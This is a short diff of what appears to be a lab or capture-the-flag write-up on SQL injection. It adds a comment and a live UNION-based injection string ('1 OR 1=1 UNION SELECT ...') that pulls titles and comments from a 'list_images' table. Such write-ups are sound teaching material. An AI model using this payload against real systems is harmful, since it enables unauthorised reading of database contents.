@@ -54,7 +54,8 @@ column : title
 Table name: list_images
 column : comment
 
-# 1 OR 1=1 UNION SELECT title, comment FROM Member_images.list_images
+# look at the comment below each member's image
+1 OR 1=1 UNION SELECT title, comment FROM Member_images.list_images
 
 .. Here we find
 
